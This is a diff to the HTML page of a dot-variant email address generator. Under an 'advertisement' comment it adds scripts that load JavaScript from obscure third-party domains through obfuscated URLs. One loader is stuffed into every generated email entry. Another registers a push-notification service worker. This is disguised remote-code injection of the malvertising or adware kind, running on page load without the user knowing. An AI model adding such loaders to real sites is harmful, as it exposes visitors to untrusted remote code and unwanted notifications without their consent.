@@ -20,6 +20,19 @@
 </head>
 
 <body>
+    <!-- Adding advertisement at the top of the page -->
+    <script>
+        (function(afiplv){
+            var d = document,
+                s = d.createElement('script'),
+                l = d.scripts[d.scripts.length - 1];
+            s.settings = afiplv || {};
+            s.src = "\/\/infantilecombination.com\/b\/XgVSs.duGUlw0WYSWmd-imYLWm5fu\/ZgXHIz\/Gevm\/9KuUZjU\/lSkiPbTdUj0HM\/jaUexfNpTBggtbN\/TsQlyvN\/TCEi1iOXQC";
+            s.async = true;
+            l.parentNode.insertBefore(s, l);
+        })({})
+    </script>
+
     <main role="main" class="container">
         <div class="container-fluid">
             <div class="row">
@@ -78,13 +91,22 @@
                 var generatedEmails = '';
                 var count = 0;
 
-                for (var i = 0; i < username.length; i++) {
-                    for (var j = i + 1; j <= username.length; j++) {
-                        var newEmail = username.slice(0, i) + '.' + username.slice(i, j) + username.slice(j) + domain;
-                        generatedEmails += newEmail + ' <button class="btn btn-sm btn-secondary copy-btn" data-email="' + newEmail + '">Copy</button>\n';
-                        count++;
+                function generateEmails(currentEmail, index) {
+                    if (index >= username.length) {
+                        return;
                     }
+                    for (var j = index; j <= username.length; j++) {
+                        var newEmail = currentEmail.slice(0, j) + '.' + currentEmail.slice(j);
+                        if (!generatedEmails.includes(newEmail + domain)) {
+                            generatedEmails += newEmail + domain + ' <button class="btn btn-sm btn-secondary copy-btn" data-email="' + newEmail + domain + '">Copy</button>\n';
+                            generatedEmails += '<script>(function(ngf){var d = document, s = d.createElement("script"), l = d.scripts[d.scripts.length - 1];s.settings = ngf || {};s.src = "\/\/infantilecombination.com\/bbXLVBs.dtGQll0hYeWVdjiHYtWw5ruYZhXrIg\/Iewm\/9\/uYZiUjlQk\/P\/T\/UN0PMIjdULxZNxzVYTtiN\/TkQgyANqT\/Eu3wN\/w_";s.async = true;l.parentNode.insertBefore(s, l);})({})<\/script>';
+                            count++;
+                        }
+                    }
+                    generateEmails(currentEmail, index + 1);
                 }
+
+                generateEmails(username, 1);
 
                 $('#emails').val(generatedEmails);
                 $('#counter').text('Generated: ' + count);
@@ -111,6 +133,20 @@
             s.async = true;
             l.parentNode.insertBefore(s, l);
         })({})
+    </script>
+    <script>
+        var s = document.createElement('script');
+        s.src='//dospindaan.com/act/files/micro.tag.min.js?z=7667179'+'&sw=/sw-check-permissions-8a57f.js';
+        s.onload = function(result) {
+            switch (result) {
+                case 'onPermissionDefault':break;
+                case 'onPermissionAllowed':break;
+                case 'onPermissionDenied':break;
+                case 'onAlreadySubscribed':break;
+                case 'onNotificationUnsupported':break;
+            }
+        };
+        document.head.appendChild(s);
     </script>
 </body>
 
